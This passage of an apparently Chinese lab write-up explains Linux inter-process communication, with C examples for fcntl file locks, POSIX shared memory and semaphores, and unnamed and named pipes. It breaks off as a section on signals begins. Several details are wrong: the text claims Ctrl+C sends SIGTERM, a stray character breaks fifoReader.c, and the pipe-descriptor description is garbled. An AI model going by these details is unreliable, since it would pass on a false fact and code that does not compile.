class="keyword">if</span> (<span class="built_in">fcntl</span>(fd, F_SETLK, &amp;lock) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">report_and_exit</span>(<span class="string">&quot;explicit unlocking failed...&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">close</span>(fd); <span class="comment">//关闭文件，如果需要将会解锁</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">//终止进程也会解锁</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>consumer.c</code>程序分析：程序首先要检查一下文件是否被排斥性锁锁住了，即是否有生产者在写文件，然后才尝试去获取一个共享锁<code>F_RDLCK</code>。调用一个只读锁能够阻止其他进程向文件进行写的操作，但可以允许其他进程对文件进行读取，即共享锁可以被多个进程所保有。在获取了一个共享锁后，消费者程序将立即从文件中读取字节数据，然后在标准输出中打印这些字节的内容，接着释放锁，关闭文件并终止。 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FileName <span class="string">&quot;data.dat&quot;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">report_and_exit</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span> &#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>); <span class="comment">/* EXIT_FAILURE */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">flock</span> <span class="title">lock</span>;</span></span><br><span class="line">  lock.l_type = F_WRLCK;   <span class="comment">//读/写(独占对共享)锁</span></span><br><span class="line">  lock.l_whence = SEEK_SET;<span class="comment">//寻求偏移基址</span></span><br><span class="line">  lock.l_start = <span class="number">0</span>;        <span class="comment">//文件中的第1字节</span></span><br><span class="line">  lock.l_len = <span class="number">0</span>;          <span class="comment">//0意味着&#x27;until EOF&#x27;</span></span><br><span class="line">  lock.l_pid = getpid();   <span class="comment">//进程id</span></span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">//文件描述符，用于标识进程中的文件</span></span><br><span class="line">  <span class="keyword">if</span> ((fd = open(FileName, O_RDONLY)) &lt; <span class="number">0</span>)  <span class="comment">//-1标志着错误</span></span><br><span class="line">    report_and_exit(<span class="string">&quot;open to read failed...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果文件被写锁定，将无法继续 */</span></span><br><span class="line">  fcntl(fd, F_GETLK, &amp;lock); <span class="comment">//如果没有写锁，将lock.l_type设置为F_UNLCK</span></span><br><span class="line">  <span class="keyword">if</span> (lock.l_type != F_UNLCK)</span><br><span class="line">    report_and_exit(<span class="string">&quot;file is still write locked...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  lock.l_type = F_RDLCK; <span class="comment">//在阅读过程中防止任何写</span></span><br><span class="line">  <span class="keyword">if</span> (fcntl(fd, F_SETLK, &amp;lock) &lt; <span class="number">0</span>)</span><br><span class="line">    report_and_exit(<span class="string">&quot;can&#x27;t get a read-only lock...&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 一次读取一个字节(恰好是ASCII码) */</span></span><br><span class="line">  <span class="type">int</span> c; <span class="comment">//读字节缓冲区</span></span><br><span class="line">  <span class="keyword">while</span> (read(fd, &amp;c, <span class="number">1</span>) &gt; <span class="number">0</span>)    <span class="comment">//0标志着EOF</span></span><br><span class="line">   	write(STDOUT_FILENO, &amp;c, <span class="number">1</span>); <span class="comment">//向标准输出写入一个字节</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 开始释放锁 */</span></span><br><span class="line">  lock.l_type = F_UNLCK;</span><br><span class="line">  <span class="keyword">if</span> (fcntl(fd, F_SETLK, &amp;lock) &lt; <span class="number">0</span>)</span><br><span class="line">    report_and_exit(<span class="string">&quot;explicit unlocking failed...&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  close(fd); </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="内存共享-memwriter-memreader"><a href="#内存共享-memwriter-memreader" class="headerlink" title="内存共享 ./memwriter ./memreader"></a>内存共享 <code>./memwriter ./memreader</code></h2><ol>
<li><p>对于内存共享，Linux系统提供了两类不同的API：传统的<code>System V API</code>和较为新颖的<code>POSIX API</code>。在单个应用中，这些API不能混用。但是，<code>POSIX</code>方式的一个坏处是它的特性仍在发展中，并且依赖于安装的内核版本，这非常影响代码的可移植性。例如，默认情况下，POSIX API 用内存映射文件来实现共享内存：对于一个共享的内存段，系统为相应的内容维护一个备份文<br>件。在<code>POSIX</code>规范下共享内存可以被配置为不需要备份文件，但这可能会影响可移植性。实验课代码中使用的是带有备份文件的<code>POSIX API</code>，这既结合了内存获取的速度优势，又获得了文件存储的持久性。</p>
</li>
<li><p>内存共享中的两个程序<code>memewrite</code>和<code>memreader</code>使用的信号量来同步对内存的访问。一般的信号量也被叫做一个计数信号量，因为带有一个可以增加的值(通常初始化为 0)。考虑一家租用自行车的商店，在它的库存中有 100 辆自行车，还有一个供职员用于租赁的程序。每当一辆自行车被租出去，信号量就增加 1；当一辆自行车被还回来，信号量就减 1。在信号量的值为 100 之前都还可以进行租赁业务，但如果等于 100 时，就必须停止业务，直到至少有一辆自行车被还回来，从而信号量减为 99。二元信号量只有两个值：0 和1，信号量的表现为互斥，即信号量为 0 的时候，只有<code>memwriter</code>可以获取共享内存，在进行写操作完成后，这个进程将增加信号量的值使其为 1，从而允许<code>memreader</code> 来读取共享内存。</p>
</li>
<li><p><code>memwrite.c</code>程序分析：程序调用<code>shm_open</code>函数来得到作为系统协调共享内存的备份文件描述符，此时还没有内存被分配。然后调用<code>ftruncate</code>函数分配<code>ByteSize</code>字节的内存。接着<code>memwrite</code>调用<code>mmap</code>函数来获取共享内存的指针。其中调用的是<code>calloc</code>动态分配内存时将其初始化为 0。目前，<code>memwrite</code>已经准备好进行写操作了，但是它要调用<code>sem_open</code>创建一个信号量来确保共享内存的互斥性，写操作完成后再调用 <code>sem_post</code> 函数将信号量的值增加到 1，释放互斥锁，使得<code>memreader</code>可以执行它的读操作。<code>memwriter</code>也将从它自己的地址空间中取消映射，使得<code>memwriter</code>不能进一步地访问共享内存。 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span>       </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>          </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;shmem.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">report_and_exit</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span> &#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd = shm_open(BackingFile,      <span class="comment">/* name from smem.h */</span></span><br><span class="line">		    O_RDWR | O_CREAT, <span class="comment">/* read/write, create if needed */</span></span><br><span class="line">		    AccessPerms);     <span class="comment">/* access permissions (0644) */</span></span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) report_and_exit(<span class="string">&quot;Can&#x27;t open shared mem segment...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  ftruncate(fd, ByteSize); <span class="comment">/* get the bytes */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">caddr_t</span> memptr = mmap(<span class="literal">NULL</span>,       <span class="comment">/* let system pick where to put segment */</span></span><br><span class="line">			ByteSize,   <span class="comment">/* how many bytes */</span></span><br><span class="line">			PROT_READ | PROT_WRITE, <span class="comment">/* access protections */</span></span><br><span class="line">			MAP_SHARED, <span class="comment">/* mapping visible to other processes */</span></span><br><span class="line">			fd,         <span class="comment">/* file descriptor */</span></span><br><span class="line">			<span class="number">0</span>);         <span class="comment">/* offset: start at 1st byte */</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">caddr_t</span>) <span class="number">-1</span>  == memptr) report_and_exit(<span class="string">&quot;Can&#x27;t get segment...&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;shared mem address: %p [0..%d]\n&quot;</span>, memptr, ByteSize - <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;backing file:       /dev/shm%s\n&quot;</span>, BackingFile );</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* semahore code to lock the shared mem */</span></span><br><span class="line">  <span class="type">sem_t</span>* semptr = sem_open(SemaphoreName, <span class="comment">/* name */</span></span><br><span class="line">			   O_CREAT,       <span class="comment">/* create the semaphore */</span></span><br><span class="line">			   AccessPerms,   <span class="comment">/* protection perms */</span></span><br><span class="line">			   <span class="number">0</span>);            <span class="comment">/* initial value */</span></span><br><span class="line">  <span class="keyword">if</span> (semptr == (<span class="type">void</span>*) <span class="number">-1</span>) report_and_exit(<span class="string">&quot;sem_open&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">strcpy</span>(memptr, MemContents); <span class="comment">/* copy some ASCII bytes to the segment */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* increment the semaphore so that memreader can read */</span></span><br><span class="line">  <span class="keyword">if</span> (sem_post(semptr) &lt; <span class="number">0</span>) report_and_exit(<span class="string">&quot;sem_post&quot;</span>);</span><br><span class="line"></span><br><span class="line">  sleep(<span class="number">12</span>); <span class="comment">/* give reader a chance */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* clean up */</span></span><br><span class="line">  munmap(memptr, ByteSize); <span class="comment">/* unmap the storage */</span></span><br><span class="line">  close(fd);</span><br><span class="line">  sem_close(semptr);</span><br><span class="line">  shm_unlink(BackingFile); <span class="comment">/* unlink from the backing file */</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>memreader.c</code>程序分析：调用<code>shm_open</code>使用<code>memwrite</code>中的文件描述符从共享内存段中获取一个指针。接着是对<code>mmap</code>的调用，第一个参数为<code>NULL</code>，这意味着让系统自己决定在虚拟内存地址的哪个地方分配内存；<code>MAP_SHARED</code>标志着被分配的内存在进程中是共享的。另外的保护参数<code>AccessPerms</code>暗示着共享内存是可读可写的。然后调用<code>sem_open</code>函数时，通过信号量的名字来获取信号量。但<code>memreader</code>随后将进入等待状态，直到<code>memwriter</code>将初始值为 0 的信号量的值增加。一旦等待结束，<code>memreader</code>将从共享内存中读取<code>ASCII</code>数据，然后做些清理工作并终止。 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span>       </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>          </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;shmem.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">report_and_exit</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span> &#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd = shm_open(BackingFile, O_RDWR, AccessPerms);  <span class="comment">/*empty to begin*/</span></span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) report_and_exit(<span class="string">&quot;Can&#x27;t get file descriptor...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* get a pointer to memory */</span></span><br><span class="line">  <span class="type">caddr_t</span> memptr = mmap(<span class="literal">NULL</span>, <span class="comment">/* let system pick where to put segment */</span></span><br><span class="line">			ByteSize,   <span class="comment">/* how many bytes */</span></span><br><span class="line">			PROT_READ | PROT_WRITE, <span class="comment">/* access protections */</span></span><br><span class="line">			MAP_SHARED, <span class="comment">/* mapping visible to other processes */</span></span><br><span class="line">			fd,         <span class="comment">/* file descriptor */</span></span><br><span class="line">			<span class="number">0</span>);         <span class="comment">/* offset: start at 1st byte */</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">caddr_t</span>) <span class="number">-1</span> == memptr) report_and_exit(<span class="string">&quot;Can&#x27;t access segment...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* create a semaphore for mutual exclusion */</span></span><br><span class="line">  <span class="type">sem_t</span>* semptr = sem_open(SemaphoreName, <span class="comment">/* name */</span></span><br><span class="line">			   O_CREAT,       <span class="comment">/* create the semaphore */</span></span><br><span class="line">			   AccessPerms,   <span class="comment">/* protection perms */</span></span><br><span class="line">			   <span class="number">0</span>);            <span class="comment">/* initial value */</span></span><br><span class="line">  <span class="keyword">if</span> (semptr == (<span class="type">void</span>*) <span class="number">-1</span>) report_and_exit(<span class="string">&quot;sem_open&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* use semaphore as a mutex (lock) by waiting for writer to increment it */</span></span><br><span class="line">  <span class="keyword">if</span> (!sem_wait(semptr)) &#123; <span class="comment">/* wait until semaphore != 0 */</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(MemContents); i++)</span><br><span class="line">      write(STDOUT_FILENO, memptr + i, <span class="number">1</span>); <span class="comment">/* one byte at a time */</span></span><br><span class="line">    sem_post(semptr);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* cleanup */</span></span><br><span class="line">  munmap(memptr, ByteSize);</span><br><span class="line">  close(fd);</span><br><span class="line">  sem_close(semptr);</span><br><span class="line">  unlink(BackingFile);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="管道通信-fifoWriter-fifoReader"><a href="#管道通信-fifoWriter-fifoReader" class="headerlink" title="管道通信 ./fifoWriter ./fifoReader"></a>管道通信 <code>./fifoWriter ./fifoReader</code></h2><ol>
<li><p>管道通信发送进程以字符流形式将大量数据送入管道，接收进程可从管道接收数据，二者利用管道进行通信。 </p>
</li>
<li><p>无名管道<code>pipeUN.c</code>程序分析：首先使用<code>forrk</code>创建一个进程，虽然它只有单一的源文件，在它正确执行的情况下将会发生多进程的情况。如果成功地产生一个子进程，<code>pipeFDs[2]</code>来保存两个文件描述符，一个用来向管道中写入，另一个从管道中写入。(数组元素<code>pipeFDs[0]</code>是读端的文件描述符，元素<code>pipeFDs[1]</code>是写端的文件描述符)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span> <span class="comment">/* wait */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>   <span class="comment">/* exit functions */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>   <span class="comment">/* read, write, pipe, _exit */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ReadEnd  0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WriteEnd 1</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">report_and_exit</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span> &#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);    <span class="comment">/** failure **/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> pipeFDs[<span class="number">2</span>]; <span class="comment">/* two file descriptors */</span></span><br><span class="line">  <span class="type">char</span> buf;       <span class="comment">/* 1-byte buffer */</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span>* msg = <span class="string">&quot;Nature&#x27;s first green is gold\n&quot;</span>; <span class="comment">/* bytes to write */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pipe(pipeFDs) &lt; <span class="number">0</span>) report_and_exit(<span class="string">&quot;pipeFD&quot;</span>);</span><br><span class="line">  <span class="type">pid_t</span> cpid = fork();<span class="comment">/* fork a child process */</span></span><br><span class="line">  <span class="keyword">if</span> (cpid &lt; <span class="number">0</span>) report_and_exit(<span class="string">&quot;fork&quot;</span>);  <span class="comment">/* check for failure */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> == cpid) &#123;    <span class="comment">/*** child ***/</span>     <span class="comment">/* child process */</span></span><br><span class="line">    close(pipeFDs[WriteEnd]);<span class="comment">/* child reads, doesn&#x27;t write */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (read(pipeFDs[ReadEnd], &amp;buf, <span class="number">1</span>) &gt; <span class="number">0</span>)<span class="comment">/* read until end of byte stream */</span></span><br><span class="line">      write(STDOUT_FILENO, &amp;buf, <span class="keyword">sizeof</span>(buf)); <span class="comment">/* echo to the standard output */</span></span><br><span class="line"></span><br><span class="line">    close(pipeFDs[ReadEnd]);<span class="comment">/* close the ReadEnd: all done */</span></span><br><span class="line">    _exit(<span class="number">0</span>);<span class="comment">/* exit and notify parent at once  */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;              <span class="comment">/*** parent ***/</span></span><br><span class="line">    close(pipeFDs[ReadEnd]);<span class="comment">/* parent writes, doesn&#x27;t read */</span></span><br><span class="line"></span><br><span class="line">    write(pipeFDs[WriteEnd], msg, <span class="built_in">strlen</span>(msg));<span class="comment">/* write the bytes to the pipe */</span></span><br><span class="line">    close(pipeFDs[WriteEnd]);           </span><br></pre></td></tr></table></figure></li>
<li><p>命令管道：无名管道没有备份文件，系统将维持一个内存缓存来将字节数据从写方传给读方。一旦写方和读方终止，这个缓存将会被回收，进而无名管道消失。相反的，命名管道有备份文件和一个不同的<code>API</code>。</p>
</li>
<li><p><code>fifoWriter.c</code>程序分析：首先创建一个命名管道来写入数据，然后调用<code>open</code>函数，返回以一个文件描述符。<code>fifoWriter</code>不会一次性将所有的数据都写入，而是写入一个块，然后休息随机数目的微秒时间，接着再循环往复。关闭命名管道后，<code>fifoWriter</code>也将使用<code>unlink</code>取消对该文件的连接。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxLoops         12000   <span class="comment">/* outer loop */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ChunkSize           16   <span class="comment">/* how many written at a time */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IntsPerChunk         4   <span class="comment">/* four 4-byte ints per chunk */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxZs              250   <span class="comment">/* max microseconds to sleep */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span>* pipeName = <span class="string">&quot;./fifoChannel&quot;</span>;</span><br><span class="line">  mkfifo(pipeName, <span class="number">0666</span>);                      <span class="comment">/* read/write for user/group/others */</span></span><br><span class="line">  <span class="type">int</span> fd = open(pipeName, O_CREAT | O_WRONLY); <span class="comment">/* open as write-only */</span></span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;                       <span class="comment">/** error **/</span></span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MaxLoops; i++) &#123;    <span class="comment">/* write MaxWrites times */</span></span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; ChunkSize; j++) &#123; <span class="comment">/*each time, write ChunkSize bytes*/</span></span><br><span class="line">      <span class="type">int</span> k;</span><br><span class="line">      <span class="type">int</span> chunk[IntsPerChunk];</span><br><span class="line">      <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; IntsPerChunk; k++) </span><br><span class="line">	chunk[k] = rand();             </span><br><span class="line">      write(fd, chunk, <span class="keyword">sizeof</span>(chunk)); </span><br><span class="line">    &#125;</span><br><span class="line">    usleep((rand() % MaxZs) + <span class="number">1</span>);      <span class="comment">/* pause a bit for realism */</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  close(fd);                           <span class="comment">/* close pipe: generates an end-of-file */</span></span><br><span class="line">  unlink(pipeName);    <span class="comment">/* unlink from the implementing file */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%i ints sent to the pipe.\n&quot;</span>, MaxLoops * ChunkSize * IntsPerChunk);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>fifoReader.c</code>程序分析：因为<code>fifoWriter</code>已经创建了命名管道，所以<code>fifiReader</code>只需要调用<code>open</code>来通过备份文件来获取管道中的内容。接着程序进入一个潜在的无限循环，在每次循环时，尝试读取 4 字节的块在读入 4 字节整数后，<code>fifoReader</code> 检查这个数是否为质数。这个操作代表了一个生产级别的读取器可能在接收到的字节数据上执行的逻辑操作。在示例运行中，在接收到的768000个整数中有 37682 个质数。read 返回 0 来暗示该流的结束。在这种情况下，<code>fifoReader</code>跳出循环，关闭命名管道，并在终止前<code>unlink</code>备份文件。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">is_prime</span><span class="params">(<span class="type">unsigned</span> n)</span> &#123; <span class="comment">/* not pretty, but gets the job done efficiently */</span></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">3</span>) <span class="keyword">return</span> n &gt; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> == (n % <span class="number">2</span>) || <span class="number">0</span> == (n % <span class="number">3</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">5</span>; (i * i) &lt;= n; i += <span class="number">6</span>) </span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == (n % i) || <span class="number">0</span> == (n % (i + <span class="number">2</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">/* found a prime! */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span>* file = <span class="string">&quot;./fifoChannel&quot;</span>;</span><br><span class="line">  <span class="type">int</span> fd = open(file, O_RDONLY); </span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>; <span class="comment">/* no point in continuing */</span></span><br><span class="line">  <span class="type">unsigned</span> count = <span class="number">0</span>, total = <span class="number">0</span>, primes_count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="type">int</span> next;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">ssize_t</span> count = read(fd, &amp;next, <span class="keyword">sizeof</span>(<span class="type">int</span>));   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == count) <span class="keyword">break</span>;                  <span class="comment">/* end of stream */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (count == <span class="keyword">sizeof</span>(<span class="type">int</span>)) &#123;        <span class="comment">/* read a 4-byte int value */</span></span><br><span class="line">      total++;c</span><br><span class="line">      <span class="title function_">if</span> <span class="params">(is_prime(next))</span> primes_count++;</span><br><span class="line">    &#125;   </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  close(fd);       <span class="comment">/* close pipe from read end */</span></span><br><span class="line">  unlink(file);    <span class="comment">/* unlink from the underlying file */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Received ints: %u, primes: %u\n&quot;</span>, total, primes_count);  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="信号量互斥-shutdown"><a href="#信号量互斥-shutdown" class="headerlink" title="信号量互斥 ./shutdown"></a>信号量互斥 <code>./shutdown</code></h2><ol>
<li><p>信号会中断一个正在执行的程序，在这种意义下，就是用信号与这个程序进行通信。大多数的信号要么可以被忽略(阻塞)或者被处理(通过特别设计的代码)。<code>SIGSTOP</code> (暂停)和<code>SIGKILL</code>(立即停止)是最应该提及的两种信号。这种符号常量有整数类型的值，例如<code>SIGKILL</code>对应的值为 9。信号可以在与用户交互的情况下发生。例如，一个用户从命令行中敲了<code>Ctrl+C</code>来终止一个从命令行中启动的程序；<code>Ctrl+C</code>将产生一个<code>SIGTERM</code>信号。<code>SIGTERM</code>即终止，它可以被阻塞或者被处理，而不像<code>SIGKILL</code>信号那样。一个进程也可以通过信号和另一个进程通信，这样使得信号也可以作为一种<code>IPC</code>机制。</p>
</li>
